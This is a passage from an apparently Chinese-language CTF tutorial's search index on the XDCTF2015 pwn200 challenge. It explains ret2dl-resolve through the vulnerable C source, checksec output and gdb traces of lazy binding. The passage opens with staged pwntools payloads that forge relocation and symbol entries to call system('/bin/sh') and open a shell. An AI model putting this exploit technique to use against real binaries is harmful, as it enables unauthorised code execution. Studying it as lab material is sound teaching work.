\n/bin/sh\\x00\n\n\n# payload_4 += \nA\n * (100 - len(payload_4))\n\n\n# io.sendline(payload_4)\n\n\n# print io.recv()\n\n\n\n# reloc_index = base_addr + 28 - rel_plt\n\n\n# fake_sym_addr = base_addr + 36\n\n\n# align = 0x10 - ((fake_sym_addr - dynsym) \n 0xf) # since the size of Elf32_Sym is 0x10\n\n\n# fake_sym_addr = fake_sym_addr + align\n\n\n# r_sym = (fake_sym_addr - dynsym) / 0x10  # calcute the symbol index since the size of Elf32_Sym\n\n\n# r_type = 0x7    # R_386_JMP_SLOT -\n Create PLT entry\n\n\n# r_info = (r_sym \n 8) + (r_type \n 0xff) # ELF32_R_INFO(sym, type) = (((sym) \n 8) + ((type) \n 0xff))\n\n\n# fake_reloc = p32(write_got) + p32(r_info)\n\n\n# st_name = 0x4c\n\n\n# st_info = 0x12\n\n\n# fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)\n\n\n# payload_5  = \nAAAA\n\n\n# payload_5 += p32(plt_0)\n\n\n# payload_5 += p32(reloc_index)\n\n\n# payload_5 += \nAAAA\n\n\n# payload_5 += p32(1)\n\n\n# payload_5 += p32(base_addr + 80)\n\n\n# payload_5 += p32(len(\n/bin/sh\n))\n\n\n# payload_5 += fake_reloc\n\n\n# payload_5 += \nA\n * align\n\n\n# payload_5 += fake_sym\n\n\n# payload_5 += \nA\n * (80 - len(payload_5))\n\n\n# payload_5 += \n/bin/sh\\x00\n\n\n# payload_5 += \nA\n * (100 - len(payload_5))\n\n\n# io.sendline(payload_5)\n\n\n# print io.recv()\n\n\n\n# reloc_index = base_addr + 28 - rel_plt\n\n\n# fake_sym_addr = base_addr + 36\n\n\n# align = 0x10 - ((fake_sym_addr - dynsym) \n 0xf)\n\n\n# fake_sym_addr = fake_sym_addr + align\n\n\n# r_sym = (fake_sym_addr - dynsym) / 0x10\n\n\n# r_type = 0x7\n\n\n# r_info = (r_sym \n 8) + (r_type \n 0xff)\n\n\n# fake_reloc = p32(write_got) + p32(r_info)\n\n\n# st_name = fake_sym_addr + 0x10 - dynstr     # address of string \nwrite\n\n\n# st_bind = 0x1   # STB_GLOBAL -\n Global symbol\n\n\n# st_type = 0x2   # STT_FUNC -\n Symbol is a code object\n\n\n# st_info = (st_bind \n 4) + (st_type \n 0xf)  # 0x12\n\n\n# fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)\n\n\n# payload_6 = \nAAAA\n\n\n# payload_6 += p32(plt_0)\n\n\n# payload_6 += p32(reloc_index)\n\n\n# payload_6 += \nAAAA\n\n\n# payload_6 += p32(1)\n\n\n# payload_6 += p32(base_addr + 80)\n\n\n# payload_6 += p32(len(\n/bin/sh\n))\n\n\n# payload_6 += fake_reloc\n\n\n# payload_6 += \nA\n * align\n\n\n# payload_6 += fake_sym\n\n\n# payload_6 += \nwrite\\x00\n\n\n# payload_6 += \nA\n * (80 - len(payload_6))\n\n\n# payload_6 += \n/bin/sh\\x00\n\n\n# payload_6 += \nA\n * (100 - len(payload_6))\n\n\n# io.sendline(payload_6)\n\n\n# print io.recv()\n\n\n\n# reloc_index = base_addr + 28 - rel_plt\n\n\n# fake_sym_addr = base_addr + 36\n\n\n# align = 0x10 - ((fake_sym_addr - dynsym) \n 0xf)\n\n\n# fake_sym_addr = fake_sym_addr + align\n\n\n# r_sym = (fake_sym_addr - dynsym) / 0x10\n\n\n# r_info = (r_sym \n 8) + 0x7\n\n\n# fake_reloc = p32(write_got) + p32(r_info)\n\n\n# st_name = fake_sym_addr + 0x10 - dynstr\n\n\n# fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)\n\n\n# payload_7  = \nAAAA\n\n\n# payload_7 += p32(plt_0)\n\n\n# payload_7 += p32(reloc_index)\n\n\n# payload_7 += \nAAAA\n\n\n# payload_7 += p32(base_addr + 80)\n\n\n# payload_7 += \nAAAA\n\n\n# payload_7 += \nAAAA\n\n\n# payload_7 += fake_reloc\n\n\n# payload_7 += \nA\n * align\n\n\n# payload_7 += fake_sym\n\n\n# payload_7 += \nsystem\\x00\n\n\n# payload_7 += \nA\n * (80 - len(payload_7))\n\n\n# payload_7 += \n/bin/sh\\x00\n\n\n# payload_7 += \nA\n * (100 - len(payload_7))\n\n\n# io.sendline(payload_7)\n\n\n\nreloc_index\n \n=\n \nbase_addr\n \n+\n \n28\n \n-\n \nrel_plt\n\n\nfake_sym_addr\n \n=\n \nbase_addr\n \n+\n \n36\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n)\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\nr_sym\n \n=\n \n(\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n\n\nr_type\n \n=\n \n0x7\n\n\nr_info\n \n=\n \n(\nr_sym\n \n \n8\n)\n \n+\n \n(\nr_type\n \n \n0xff\n)\n\n\nfake_reloc\n \n=\n \np32\n(\nwrite_got\n)\n \n+\n \np32\n(\nr_info\n)\n\n\nst_name\n \n=\n \nfake_sym_addr\n \n+\n \n0x10\n \n-\n \ndynstr\n\n\nst_bind\n \n=\n \n0x1\n\n\nst_type\n \n=\n \n0x2\n\n\nst_info\n \n=\n \n(\nst_bind\n \n \n4\n)\n \n+\n \n(\nst_type\n \n \n0xf\n)\n\n\nfake_sym\n \n=\n \np32\n(\nst_name\n)\n \n+\n \np32\n(\n0\n)\n \n+\n \np32\n(\n0\n)\n \n+\n \np32\n(\nst_info\n)\n\n\npayload_7\n \n=\n \nAAAA\n\n\npayload_7\n \n+=\n \np32\n(\nplt_0\n)\n\n\npayload_7\n \n+=\n \np32\n(\nreloc_index\n)\n\n\npayload_7\n \n+=\n \nAAAA\n\n\npayload_7\n \n+=\n \np32\n(\nbase_addr\n \n+\n \n80\n)\n\n\npayload_7\n \n+=\n \nAAAA\n\n\npayload_7\n \n+=\n \nAAAA\n\n\npayload_7\n \n+=\n \nfake_reloc\n\n\npayload_7\n \n+=\n \nA\n \n*\n \nalign\n\n\npayload_7\n \n+=\n \nfake_sym\n\n\npayload_7\n \n+=\n \nsystem\n\\x00\n\n\npayload_7\n \n+=\n \nA\n \n*\n \n(\n80\n \n-\n \nlen\n(\npayload_7\n))\n\n\npayload_7\n \n+=\n \n/bin/sh\n\\x00\n\n\npayload_7\n \n+=\n \nA\n \n*\n \n(\n100\n \n-\n \nlen\n(\npayload_7\n))\n\n\nio\n.\nsendline\n(\npayload_7\n)\n\n\nio\n.\ninteractive\n()\n\n\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nHow the ELF Ruined Christmas\n\n\nReturn-to-dl-resolve", 
            "title": "XDCTF2015 pwn200"
        }, 
        {
            "location": "/pwn/lab/6.1.3_pwn_xdctf2015_pwn200/#_1", 
            "text": "\u51fa\u9898\u4eba\u5728\u535a\u5ba2\u91cc\u8d34\u51fa\u4e86\u6e90\u7801\uff0c\u5982\u4e0b\uff1a #include   unistd.h  #include   stdio.h  #include   string.h  void   vuln ()  { \n     char   buf [ 100 ]; \n     setbuf ( stdin ,   buf ); \n     read ( 0 ,   buf ,   256 );  }  int   main ()  { \n     char   buf [ 100 ]   =   Welcome to XDCTF2015~! \\n ; \n\n     setbuf ( stdout ,   buf ); \n     write ( 1 ,   buf ,   strlen ( buf )); \n     vuln (); \n     return   0 ;  }  \n\u4f7f\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u7f16\u8bd1\uff1a $ gcc -m32 -fno-stack-protector -no-pie -s pwn200.c \nchecksec \u5982\u4e0b\uff1a $ checksec -f a.out\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No     0               1       a.out \n\u5728\u5f00\u542f ASLR \u7684\u60c5\u51b5\u4e0b\u628a\u7a0b\u5e8f\u8fd0\u884c\u8d77\u6765\uff1a $ socat tcp4-listen:10001,reuseaddr,fork exec:./a.out   \n\u8fd9\u9898\u63d0\u4f9b\u4e86\u4e8c\u8fdb\u5236\u6587\u4ef6\u800c\u6ca1\u6709\u63d0\u4f9b libc.so\uff0c\u800c\u4e14\u4e5f\u9ed8\u8ba4\u627e\u4e0d\u5230\uff0c\u5728\u7ae0\u8282 4.8 \u4e2d\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u89e3\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u8bb2\u89e3\u53e6\u4e00\u79cd\u3002", 
            "title": "\u9898\u76ee\u590d\u73b0"
        }, 
        {
            "location": "/pwn/lab/6.1.3_pwn_xdctf2015_pwn200/#ret2dl-resolve", 
            "text": "\u8fd9\u79cd\u5229\u7528\u7684\u6280\u672f\u662f\u5728 2015 \u5e74\u7684\u8bba\u6587 \u201cHow the ELF Ruined Christmas\u201d \u4e2d\u63d0\u51fa\u7684\uff0c\u8bba\u6587\u5730\u5740\u5728\u53c2\u8003\u8d44\u6599\u4e2d\u3002ret2dl-resolve \u4e0d\u9700\u8981\u4fe1\u606f\u6cc4\u9732\uff0c\u800c\u662f\u901a\u8fc7\u52a8\u6001\u88c5\u8f7d\u5668\u6765\u76f4\u63a5\u6807\u8bc6\u5173\u952e\u51fd\u6570\u7684\u4f4d\u7f6e\u5e76\u8c03\u7528\u5b83\u4eec\u3002\u5b83\u53ef\u4ee5\u7ed5\u8fc7\u591a\u79cd\u5b89\u5168\u7f13\u89e3\u63aa\u65bd\uff0c\u5305\u62ec\u4e13\u95e8\u4e3a\u4fdd\u62a4 ELF \u6570\u636e\u7ed3\u6784\u4e0d\u88ab\u7834\u574f\u800c\u8bbe\u8ba1\u7684 RELRO\u3002\u800c\u5728 ctf \u4e2d\uff0c\u6211\u4eec\u4e5f\u80fd\u770b\u5230\u5b83\u7684\u8eab\u5f71\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u4ed8\u65e0\u6cd5\u83b7\u5f97\u76ee\u6807\u7cfb\u7edf libc.so \u7684\u60c5\u51b5\u3002", 
            "title": "ret2dl-resolve \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.3_pwn_xdctf2015_pwn200/#_2", 
            "text": "\u5173\u4e8e\u52a8\u6001\u94fe\u63a5\u6211\u4eec\u5728\u7ae0\u8282 1.5.6 \u4e2d\u5df2\u7ecf\u8bb2\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5c31\u91cd\u70b9\u8bb2\u4e00\u4e0b\u52a8\u6001\u89e3\u6790\u7684\u8fc7\u7a0b\u3002\u6211\u4eec\u77e5\u9053\uff0c\u5728\u52a8\u6001\u94fe\u63a5\u4e2d\uff0c\u5982\u679c\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542f Full RELRO \u4fdd\u62a4\uff0c\u5219\u5b58\u5728\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u8fc7\u7a0b\uff0c\u5373\u5e93\u51fd\u6570\u5728\u7b2c\u4e00\u6b21\u88ab\u8c03\u7528\u65f6\u624d\u5c06\u51fd\u6570\u7684\u771f\u6b63\u5730\u5740\u586b\u5165 GOT \u8868\u4ee5\u5b8c\u6210\u7ed1\u5b9a\u3002  \u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u7684\u7a0b\u5e8f\u5934\u8868\u4e2d\u4f1a\u5305\u542b\u7c7b\u578b\u4e3a  PT_DYNAMIC  \u7684\u6bb5\uff0c\u5b83\u5305\u542b\u4e86  .dynamic  \u6bb5\uff0c\u7ed3\u6784\u5982\u4e0b\uff1a typedef   struct  { \n   Elf32_Sword     d_tag ;            /* Dynamic entry type */ \n   union \n     { \n       Elf32_Word   d_val ;           /* Integer value */ \n       Elf32_Addr   d_ptr ;           /* Address value */ \n     }   d_un ;  }   Elf32_Dyn ;  typedef   struct  { \n   Elf64_Sxword    d_tag ;            /* Dynamic entry type */ \n   union \n     { \n       Elf64_Xword   d_val ;          /* Integer value */ \n       Elf64_Addr   d_ptr ;           /* Address value */ \n     }   d_un ;  }   Elf64_Dyn ;  \n\u4e00\u4e2a  Elf_Dyn  \u662f\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u5176\u4e2d  d_tag  \u662f\u952e\uff0c d_value  \u662f\u503c\u3002\u5176\u4e2d\u6709\u4e2a\u4f8b\u5916\u7684\u6761\u76ee\u662f  DT_DEBUG \uff0c\u5b83\u4fdd\u5b58\u4e86\u52a8\u6001\u88c5\u8f7d\u5668\u5185\u90e8\u6570\u636e\u7ed3\u6784\u7684\u6307\u9488\u3002  \u6bb5\u8868\u7ed3\u6784\u5982\u4e0b\uff1a typedef   struct  { \n   Elf32_Word      sh_name ;          /* Section name (string tbl index) */ \n   Elf32_Word      sh_type ;          /* Section type */ \n   Elf32_Word      sh_flags ;         /* Section flags */ \n   Elf32_Addr      sh_addr ;          /* Section virtual addr at execution */ \n   Elf32_Off   sh_offset ;        /* Section file offset */ \n   Elf32_Word      sh_size ;          /* Section size in bytes */ \n   Elf32_Word      sh_link ;          /* Link to another section */ \n   Elf32_Word      sh_info ;          /* Additional section information */ \n   Elf32_Word      sh_addralign ;         /* Section alignment */ \n   Elf32_Word      sh_entsize ;       /* Entry size if section holds table */  }   Elf32_Shdr ;  typedef   struct  { \n   Elf64_Word      sh_name ;          /* Section name (string tbl index) */ \n   Elf64_Word      sh_type ;          /* Section type */ \n   Elf64_Xword     sh_flags ;         /* Section flags */ \n   Elf64_Addr      sh_addr ;          /* Section virtual addr at execution */ \n   Elf64_Off   sh_offset ;        /* Section file offset */ \n   Elf64_Xword     sh_size ;          /* Section size in bytes */ \n   Elf64_Word      sh_link ;          /* Link to another section */ \n   Elf64_Word      sh_info ;          /* Additional section information */ \n   Elf64_Xword     sh_addralign ;         /* Section alignment */ \n   Elf64_Xword     sh_entsize ;       /* Entry size if section holds table */  }   Elf64_Shdr ;   \u5177\u4f53\u6765\u770b\uff0c\u9996\u5148\u5728 write@plt \u5730\u5740\u5904\u4e0b\u65ad\u70b9\uff0c\u7136\u540e\u8fd0\u884c\uff1a gdb-peda$ p write\n$1 = { text variable, no debug info } 0x8048430  write@plt \ngdb-peda$ b *0x8048430\nBreakpoint 1 at 0x8048430\ngdb-peda$ r\nStarting program: /home/firmy/Desktop/RE4B/200/a.out\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc ( Welcome to XDCTF2015~!\\n )\nEBX: 0x804a000 --  0x8049f04 --  0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --  0x1d1d30\nEDI: 0xffffd620 --  0x1\nEBP: 0xffffd638 --  0x0\nESP: 0xffffd59c --  0x804861b (add    esp,0x10)\nEIP: 0x8048430 ( write@plt :    jmp    DWORD PTR ds:0x804a01c)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048420  __libc_start_main@plt :   jmp    DWORD PTR ds:0x804a018\n   0x8048426  __libc_start_main@plt+6 : push   0x18\n   0x804842b  __libc_start_main@plt+11 :        jmp    0x80483e0\n=  0x8048430  write@plt :       jmp    DWORD PTR ds:0x804a01c\n | 0x8048436  write@plt+6 :     push   0x20\n | 0x804843b  write@plt+11 :    jmp    0x80483e0\n | 0x8048440:   jmp    DWORD PTR ds:0x8049ff0\n | 0x8048446:   xchg   ax,ax\n |-    0x8048436  write@plt+6 : push   0x20\n       0x804843b  write@plt+11 :        jmp    0x80483e0\n       0x8048440:       jmp    DWORD PTR ds:0x8049ff0\n       0x8048446:       xchg   ax,ax\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd59c --  0x804861b (add    esp,0x10)\n0004| 0xffffd5a0 --  0x1\n0008| 0xffffd5a4 --  0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n0012| 0xffffd5a8 --  0x17\n0016| 0xffffd5ac --  0x80485a4 (add    ebx,0x1a5c)\n0020| 0xffffd5b0 --  0xffffd5ea --  0x0\n0024| 0xffffd5b4 --  0xf7ffca64 --  0x6\n0028| 0xffffd5b8 --  0xf7ffca68 --  0x3c ( )\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x08048430 in write@plt ()\ngdb-peda$ x/w 0x804a01c\n0x804a01c:      0x08048436 \n\u7531\u4e8e\u662f\u7b2c\u4e00\u6b21\u8fd0\u884c\uff0c\u5c1a\u672a\u8fdb\u884c\u7ed1\u5b9a\uff0c 0x804a01c  \u5730\u5740\u5904\u4fdd\u5b58\u7684\u662f write@plt+6 \u7684\u5730\u5740  0x8048436 \uff0c\u5373\u8df3\u8f6c\u5230\u4e0b\u4e00\u6761\u6307\u4ee4\u3002  \u5c06  0x20  \u538b\u5165\u6808\u4e2d\uff0c\u8fd9\u4e2a\u6570\u5b57\u662f\u5bfc\u5165\u51fd\u6570\u7684\u6807\u8bc6\uff0c\u5373\u4e00\u4e2a ELF_Rel \u5728  .rel.plt  \u4e2d\u7684\u504f\u79fb\uff1a gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc ( Welcome to XDCTF2015~!\\n )\nEBX: 0x804a000 --  0x8049f04 --  0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --  0x1d1d30\nEDI: 0xffffd620 --  0x1\nEBP: 0xffffd638 --  0x0\nESP: 0xffffd59c --  0x804861b (add    esp,0x10)\nEIP: 0x8048436 ( write@plt+6 :  push   0x20)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048426  __libc_start_main@plt+6 : push   0x18\n   0x804842b  __libc_start_main@plt+11 :        jmp    0x80483e0\n   0x8048430  write@plt :       jmp    DWORD PTR ds:0x804a01c\n=  0x8048436  write@plt+6 :     push   0x20\n   0x804843b  write@plt+11 :    jmp    0x80483e0\n   0x8048440:   jmp    DWORD PTR ds:0x8049ff0\n   0x8048446:   xchg   ax,ax\n   0x8048448:   add    BYTE PTR [eax],al\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd59c --  0x804861b (add    esp,0x10)\n0004| 0xffffd5a0 --  0x1\n0008| 0xffffd5a4 --  0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n0012| 0xffffd5a8 --  0x17\n0016| 0xffffd5ac --  0x80485a4 (add    ebx,0x1a5c)\n0020| 0xffffd5b0 --  0xffffd5ea --  0x0\n0024| 0xffffd5b4 --  0xf7ffca64 --  0x6\n0028| 0xffffd5b8 --  0xf7ffca68 --  0x3c ( )\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x08048436 in write@plt ()  \u7136\u540e\u8df3\u8f6c\u5230  0x80483e0 \uff0c\u8be5\u5730\u5740\u662f  .plt  \u6bb5\u7684\u5f00\u5934\uff0c\u5373 PLT[0]\uff1a gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc ( Welcome to XDCTF2015~!\\n )\nEBX: 0x804a000 --  0x8049f04 --  0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --  0x1d1d30\nEDI: 0xffffd620 --  0x1\nEBP: 0xffffd638 --  0x0\nESP: 0xffffd598 --  0x20 (   )\nEIP: 0x804843b ( write@plt+11 : jmp    0x80483e0)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x804842b  __libc_start_main@plt+11 :        jmp    0x80483e0\n   0x8048430  write@plt :       jmp    DWORD PTR ds:0x804a01c\n   0x8048436  write@plt+6 :     push   0x20\n=  0x804843b  write@plt+11 :    jmp    0x80483e0\n | 0x8048440:   jmp    DWORD PTR ds:0x8049ff0\n | 0x8048446:   xchg   ax,ax\n | 0x8048448:   add    BYTE PTR [eax],al\n | 0x804844a:   add    BYTE PTR [eax],al\n |-    0x80483e0:       push   DWORD PTR ds:0x804a004\n       0x80483e6:       jmp    DWORD PTR ds:0x804a008\n       0x80483ec:       add    BYTE PTR [eax],al\n       0x80483ee:       add    BYTE PTR [eax],al\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd598 --  0x20 (   )\n0004| 0xffffd59c --  0x804861b (add    esp,0x10)\n0008| 0xffffd5a0 --  0x1\n0012| 0xffffd5a4 --  0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n0016| 0xffffd5a8 --  0x17\n0020| 0xffffd5ac --  0x80485a4 (add    ebx,0x1a5c)\n0024| 0xffffd5b0 --  0xffffd5ea --  0x0\n0028| 0xffffd5b4 --  0xf7ffca64 --  0x6\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0804843b in write@plt ()  $ readelf -S a.out | grep 80483e0\n  [12] .plt              PROGBITS        080483e0 0003e0 000060 04  AX  0   0 16  \u63a5\u4e0b\u6765\u5c31\u8fdb\u5165 PLT[0] \u5904\u7684\u4ee3\u7801\uff1a gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc ( Welcome to XDCTF2015~!\\n )\nEBX: 0x804a000 --  0x8049f04 --  0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --  0x1d1d30\nEDI: 0xffffd620 --  0x1\nEBP: 0xffffd638 --  0x0\nESP: 0xffffd598 --  0x20 (   )\nEIP: 0x80483e0 (push   DWORD PTR ds:0x804a004)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n=  0x80483e0:   push   DWORD PTR ds:0x804a004\n   0x80483e6:   jmp    DWORD PTR ds:0x804a008\n   0x80483ec:   add    BYTE PTR [eax],al\n   0x80483ee:   add    BYTE PTR [eax],al\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd598 --  0x20 (   )\n0004| 0xffffd59c --  0x804861b (add    esp,0x10)\n0008| 0xffffd5a0 --  0x1\n0012| 0xffffd5a4 --  0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n0016| 0xffffd5a8 --  0x17\n0020| 0xffffd5ac --  0x80485a4 (add    ebx,0x1a5c)\n0024| 0xffffd5b0 --  0xffffd5ea --  0x0\n0028| 0xffffd5b4 --  0xf7ffca64 --  0x6\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080483e0 in ?? ()\ngdb-peda$ x/w 0x804a004\n0x804a004:      0xf7ffd900\ngdb-peda$ x/w 0x804a008\n0x804a008:      0xf7fec370  $ readelf -S a.out | grep .got.plt\n  [23] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4 \n\u770b\u4e00\u4e0b  .got.plt  \u6bb5\uff0c\u6240\u4ee5  0x804a004  \u548c  0x804a008  \u5206\u522b\u662f GOT[1] \u548c GOT[2]\u3002\u7ee7\u7eed\u8c03\u8bd5\uff1a  gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc ( Welcome to XDCTF2015~!\\n )\nEBX: 0x804a000 --  0x8049f04 --  0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --  0x1d1d30\nEDI: 0xffffd620 --  0x1\nEBP: 0xffffd638 --  0x0\nESP: 0xffffd594 --  0xf7ffd900 --  0x0\nEIP: 0x80483e6 (jmp    DWORD PTR ds:0x804a008)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80483dd:   add    BYTE PTR [eax],al\n   0x80483df:   add    bh,bh\n   0x80483e1:   xor    eax,0x804a004\n=  0x80483e6:   jmp    DWORD PTR ds:0x804a008\n | 0x80483ec:   add    BYTE PTR [eax],al\n | 0x80483ee:   add    BYTE PTR [eax],al\n | 0x80483f0  setbuf@plt :      jmp    DWORD PTR ds:0x804a00c\n | 0x80483f6  setbuf@plt+6 :    push   0x0\n |-    0xf7fec370  _dl_runtime_resolve :        push   eax\n       0xf7fec371  _dl_runtime_resolve+1 :      push   ecx\n       0xf7fec372  _dl_runtime_resolve+2 :      push   edx\n       0xf7fec373  _dl_runtime_resolve+3 :      mov    edx,DWORD PTR [esp+0x10]\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd594 --  0xf7ffd900 --  0x0\n0004| 0xffffd598 --  0x20 (   )\n0008| 0xffffd59c --  0x804861b (add    esp,0x10)\n0012| 0xffffd5a0 --  0x1\n0016| 0xffffd5a4 --  0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n0020| 0xffffd5a8 --  0x17\n0024| 0xffffd5ac --  0x80485a4 (add    ebx,0x1a5c)\n0028| 0xffffd5b0 --  0xffffd5ea --  0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080483e6 in ?? () \nPLT[0] \u5904\u7684\u4ee3\u7801\u5c06 GOT[1] \u7684\u503c\u538b\u5165\u6808\u4e2d\uff0c\u7136\u540e\u8df3\u8f6c\u5230 GOT[2]\u3002\u8fd9\u4e24\u4e2a GOT \u8868\u6761\u76ee\u6709\u7740\u7279\u6b8a\u7684\u542b\u4e49\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5f00\u59cb\u65f6\u7ed9\u5b83\u4eec\u586b\u5145\u4e86\u7279\u6b8a\u7684\u5185\u5bb9\uff1a\n- GOT[1]\uff1a\u4e00\u4e2a\u6307\u5411\u5185\u90e8\u6570\u636e\u7ed3\u6784\u7684\u6307\u9488\uff0c\u7c7b\u578b\u662f link_map\uff0c\u5728\u52a8\u6001\u88c5\u8f7d\u5668\u5185\u90e8\u4f7f\u7528\uff0c\u5305\u542b\u4e86\u8fdb\u884c\u7b26\u53f7\u89e3\u6790\u9700\u8981\u7684\u5f53\u524d ELF \u5bf9\u8c61\u7684\u4fe1\u606f\u3002\u5728\u5b83\u7684  l_info  \u57df\u4e2d\u4fdd\u5b58\u4e86  .dynamic  \u6bb5\u4e2d\u5927\u591a\u6570\u6761\u76ee\u7684\u6307\u9488\u6784\u6210\u7684\u4e00\u4e2a\u6570\u7ec4\uff0c\u6211\u4eec\u540e\u9762\u4f1a\u5229\u7528\u5b83\u3002\n- GOT[2]\uff1a\u4e00\u4e2a\u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d  _dl_runtime_resolve  \u51fd\u6570\u7684\u6307\u9488\u3002  \u51fd\u6570\u4f7f\u7528\u53c2\u6570  link_map_obj  \u6765\u83b7\u53d6\u89e3\u6790\u5bfc\u5165\u51fd\u6570\uff08\u4f7f\u7528 reloc_index \u53c2\u6570\u6807\u8bc6\uff09\u9700\u8981\u7684\u4fe1\u606f\uff0c\u5e76\u5c06\u7ed3\u679c\u5199\u5230\u6b63\u786e\u7684 GOT \u6761\u76ee\u4e2d\u3002\u5728  _dl_runtime_resolve  \u89e3\u6790\u5b8c\u6210\u540e\uff0c\u63a7\u5236\u6d41\u5c31\u4ea4\u5230\u4e86\u90a3\u4e2a\u51fd\u6570\u624b\u91cc\uff0c\u800c\u4e0b\u6b21\u518d\u8c03\u7528\u51fd\u6570\u7684 plt \u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fdb\u5165\u76ee\u6807\u51fd\u6570\u4e2d\u6267\u884c\u3002  _dl-runtime-resolve  \u7684\u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff1a   \u91cd\u5b9a\u4f4d\u9879\u4f7f\u7528 Elf_Rel \u7ed3\u6784\u4f53\u6765\u63cf\u8ff0\uff0c\u5b58\u5728\u4e8e  .rep.plt  \u6bb5\u548c  .rel.dyn  \u6bb5\u4e2d\uff1a typedef   uint32_t   Elf32_Addr ;  typedef   uint32_t   Elf32_Word ;  typedef   struct  { \n   Elf32_Addr      r_offset ;         /* Address */ \n   Elf32_Word      r_info ;           /* Relocation type and symbol index */  }   Elf32_Rel ;  typedef   uint64_t   Elf64_Addr ;  typedef   uint64_t   Elf64_Xword ;  typedef   int64_t    Elf64_Sxword ;  typedef   struct  { \n   Elf64_Addr      r_offset ;         /* Address */ \n   Elf64_Xword     r_info ;           /* Relocation type and symbol index */ \n   Elf64_Sxword    r_addend ;         /* Addend */  }   Elf64_Rela ;  \n32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528 REL\uff0c\u800c 64 \u4f4d\u7a0b\u5e8f\u4f7f\u7528 RELA\u3002  \u4e0b\u9762\u7684\u5b8f\u63cf\u8ff0\u4e86 r_info \u662f\u600e\u6837\u88ab\u89e3\u6790\u548c\u63d2\u5165\u7684\uff1a /* How to extract and insert information held in the r_info field.  */  #define ELF32_R_SYM(val)        ((val)   8)  #define ELF32_R_TYPE(val)       ((val)   0xff)  #define ELF32_R_INFO(sym, type)     (((sym)   8) + ((type)   0xff))  #define ELF64_R_SYM(i)          ((i)   32)  #define ELF64_R_TYPE(i)         ((i)   0xffffffff)  #define ELF64_R_INFO(sym,type)      ((((Elf64_Xword) (sym))   32) + (type))  \n\u4e3e\u4e2a\u4f8b\u5b50\uff1a ELF32_R_SYM(Elf32_Rel- r_info) = (Elf32_Rel- r_info)   8  \u6bcf\u4e2a\u7b26\u53f7\u4f7f\u7528 Elf_Sym \u7ed3\u6784\u4f53\u6765\u63cf\u8ff0\uff0c\u5b58\u5728\u4e8e  .dynsym  \u6bb5\u548c  .symtab  \u6bb5\u4e2d\uff0c\u800c  .symtab  \u5728 strip \u4e4b\u540e\u4f1a\u88ab\u5220\u6389\uff1a typedef   struct  { \n   Elf32_Word      st_name ;          /* Symbol name (string tbl index) */ \n   Elf32_Addr      st_value ;         /* Symbol value */ \n   